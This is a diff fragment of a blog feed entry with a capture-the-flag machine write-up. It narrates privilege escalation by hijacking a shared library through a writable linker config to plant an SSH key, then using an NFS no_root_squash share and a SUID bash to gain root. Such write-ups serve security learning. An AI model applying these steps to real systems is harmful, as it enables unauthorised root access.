+&lt;p&gt;While enumerating the machine as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;www-data&lt;/code&gt;, I find a custom binary named &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;myapp&lt;/code&gt; in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/home/john&lt;/code&gt; directory. Looking around the filesystem reveals the following symlink:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/etc/ld.so.conf.d/x86_64-libc.conf -&amp;gt; /home/john/develop/test.conf
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Using the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ldd&lt;/code&gt; command on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;myapp&lt;/code&gt; shows the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/lib/libcustom.so&lt;/code&gt; library as a dependency. This library contains the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;do_ping()&lt;/code&gt; function which I overwrite by compiling a malicious &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;do_ping()&lt;/code&gt; function in a my own &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;libcustom.so&lt;/code&gt; file which I store in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/home/john/develop/&lt;/code&gt; directory.&lt;/p&gt;
+
+&lt;p&gt;After that I write &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/home/john/develop/&lt;/code&gt; in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;test.conf&lt;/code&gt; file to make the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;myapp&lt;/code&gt; file load my malicious library and execute my &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;do_ping()&lt;/code&gt; function.&lt;/p&gt;
+
+&lt;p&gt;I use this exploit to copy my ssh public key into john’s &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;authorized_keys&lt;/code&gt; file and am now able to ssh as the user &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;john&lt;/code&gt;.&lt;/p&gt;
+
+&lt;h2 id=&quot;local-port-forwading-and-nfs-no_root_squash&quot;&gt;Local Port Forwading and NFS no_root_squash&lt;/h2&gt;
+&lt;p&gt;Once authenticated as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;john&lt;/code&gt; I run &lt;em&gt;linpeas.sh&lt;/em&gt; to find port 2049 is running, and that the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;no_root_squash&lt;/code&gt; parameter is enabled for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/nfs&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;To exploit this vulnerability I use ssh to port forward &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;127.0.0.1:2049&lt;/code&gt; to a port on my own machine and mount the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/nfs&lt;/code&gt; share.&lt;/p&gt;
+
+&lt;p&gt;On my machine, I copy &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/bin/bash&lt;/code&gt; as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt; and chmod it to have the SUID property. I copy it into the mounted directory and use run it with the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-p&lt;/code&gt; flag on the victim machine to generate a shell as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt;.&lt;/p&gt;
+</content>
+ </entry>
  
  <entry>
    <title>CTF Log - H@cktivityCon 2021 CTF</title>
